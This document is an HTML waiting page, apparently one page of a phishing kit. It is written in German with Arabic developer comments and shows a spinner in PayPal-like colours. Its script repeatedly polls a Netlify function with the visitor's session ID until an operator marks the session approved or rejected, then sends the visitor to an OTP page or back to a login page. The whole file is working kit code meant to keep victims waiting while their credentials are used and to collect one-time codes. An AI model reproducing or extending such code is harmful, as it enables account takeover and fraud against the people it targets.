<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Genehmigung ausstehend...</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        /* الأنماط المدمجة ضرورية */
        body { justify-content: center; align-items: center; }
        .waiting-container { text-align: center; padding: 40px; }
        .logo-text { font-size: 38px; font-weight: bold; color: #000000; margin-bottom: 40px; display: block; }
        .security-message { font-size: 18px; color: #000000; font-weight: 500; margin-bottom: 30px; }
        .spinner-large { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0070ba; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="waiting-container">
        <span class="logo-text">donsaa</span>
        <div class="spinner-large"></div>
        <div class="security-message">
            Ihre Anforderung wird überprüft. Bitte warten Sie auf die Genehmigung...
        </div>
    </div>
    
    <script>
        // ---------------------------------------------------------------
        // منطق فحص حالة الجلسة (Polling)
        // ---------------------------------------------------------------
        document.addEventListener('DOMContentLoaded', function() {
            // استخراج Session ID من رابط URL
            const urlParams = new URLSearchParams(window.location.search);
            const sessionId = urlParams.get('id');

            if (!sessionId) {
                // إذا لم يكن هناك ID، نعود لصفحة الدخول
                window.location.href = '/'; 
                return;
            }

            const checkStatus = async () => {
                try {
                    // استدعاء دالة Netlify لفحص الحالة كل 3 ثواني
                    const response = await fetch(`/.netlify/functions/check_status?id=${sessionId}`);
                    const data = await response.json();
                    const status = data.status;

                    if (status === 'approved') {
                        // الموافقة: التوجيه لصفحة OTP
                        window.location.href = '/otp.html';
                        clearInterval(pollInterval);
                    } else if (status === 'rejected') {
                        // الرفض: التوجيه لصفحة الدخول مجدداً
                        window.location.href = '/'; 
                        clearInterval(pollInterval);
                    }
                    // إذا كانت pending (قيد الانتظار)، نستمر في الفحص
                    
                } catch (error) {
                    console.error("Error checking session status, retrying...", error);
                }
            };

            // بدء الفحص كل 3 ثواني
            const pollInterval = setInterval(checkStatus, 3000); 

            // فحص فوري عند التحميل
            checkStatus();
        });
    </script>

</body>
</html>
